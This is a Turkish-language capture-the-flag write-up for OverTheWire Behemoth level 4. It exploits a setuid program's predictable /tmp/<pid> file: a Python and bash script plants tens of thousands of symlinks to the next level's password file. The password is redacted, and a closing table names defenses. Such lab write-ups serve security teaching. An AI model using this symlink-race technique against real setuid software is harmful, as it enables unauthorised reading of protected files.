# OverTheWire — Behemoth Level 4 → 5

> Hedef: `behemoth4`'ten `behemoth5` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: `fopen("/tmp/<pid>")` → **symlink** ile şifre dosyasına yönlendirme.

---

## 1. Bağlantı
```bash
ssh behemoth4@behemoth.labs.overthewire.org -p 2221
```

## 2. Zafiyet — ltrace + disasm
```c
pid = getpid();
sprintf(buf, "/tmp/%d", pid);
f = fopen("/tmp/<pid>", "r");
if(!f){ puts("PID not found!"); exit; }
sleep(1);
... loop: c = fgetc(f); putchar(c);   // dosya içeriğini BASAR (suid behemoth5)
```
`/tmp/<pid>`'i okuyup basıyor. **Symlink** ile bunu `/etc/behemoth_pass/behemoth5`'e bağlarsam,
program (behemoth5 yetkisiyle) şifreyi basar.

## 3. Sorun: PID öngörülemez (`pid_max = 4194304`)
PID'ler **sıralı** atanır → bir anchor pid'den sonraki geniş aralık için symlink kur, sonra çalıştır.

## 4. Exploit
```bash
BASE=$$                                  # anchor (oturum bash pid'i)
python3 -c 'import os,sys
base=int(sys.argv[1])
for i in range(base, base+60000):
    try: os.symlink("/etc/behemoth_pass/behemoth5","/tmp/%d"%i)
    except OSError: pass' $BASE
for n in $(seq 1 30); do
  OUT=$(/behemoth/behemoth4 2>/dev/null)
  echo "$OUT" | grep -q 'PID not found' || { echo "$OUT"; break; }   # HIT -> şifre
done
```
> behemoth4'ün pid'i `[BASE, BASE+60000]` penceresinde → symlink'i bulur → şifreyi basar
> (sleep(1) sonrası). Tek run yeter (pid'ler ardışık).


## Dersler
| Konu | Not |
|------|-----|
| symlink yönlendirme | suid programın okuduğu yolu şifre dosyasına bağla |
| öngörülebilir dosya adı | `/tmp/<pid>` → saldırgan symlink'i önceden kurabilir |
| pid brute (pencere) | pid'ler ardışık → anchor + geniş aralık symlink |
| savunma | `mkstemp`/`O_NOFOLLOW` ile öngörülebilir /tmp dosyalarından kaçın |
